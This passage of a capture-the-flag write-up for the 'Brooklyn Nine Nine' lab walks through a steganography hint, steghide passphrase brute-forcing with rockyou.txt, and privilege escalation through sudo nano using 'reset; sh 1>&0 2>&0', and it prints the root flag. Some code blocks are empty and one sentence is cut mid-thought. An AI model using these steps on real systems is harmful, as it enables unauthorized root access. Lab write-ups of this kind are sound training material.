From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
While the information from these messages is useful, it’s not sufficient, so I decided to explore the website hosted on port 80.

By exploring the website source code, I found the following message:

```
(...)

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>

(...)
```

Based on these clues, I decided my next step would be to download the only image on the website and use steghide to analyze it for hidden data.

**Using steghide and stegcracker to reveal hidden information**

```
# steghide extract -sf /home/<redacted>/Downloads/brooklyn99.jpg
Enter passphrase: 
```
The file is protected with a passphrase, so I’ll use stegcracker to brute force the password and extract the hidden data.
```

```

will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

Was able to get the user flag

```
holt@brookly_nine_nine:~$ ls

```

**Escalating privileges in a Linux Machine**

```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano

```

The sudo -l command output shows that the user holt can run nano as root without needing to enter a password.

To exploit this, I decided to run a shell from within the nano text editor by following these steps:

First, I ran nano as sudo:

```
holt@brookly_nine_nine:~$ sudo /bin/nano
```

To spawn a root shell from within nano:

  - Once inside nano, press Ctrl+R (to read a file).
  - Then press Ctrl+X.
  - At the prompt, enter the following command to spawn a root shell:

```
reset; sh 1>&0 2>&0
```

With the root shell acquired, I was able to obtain the root flag:

```
# cat root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
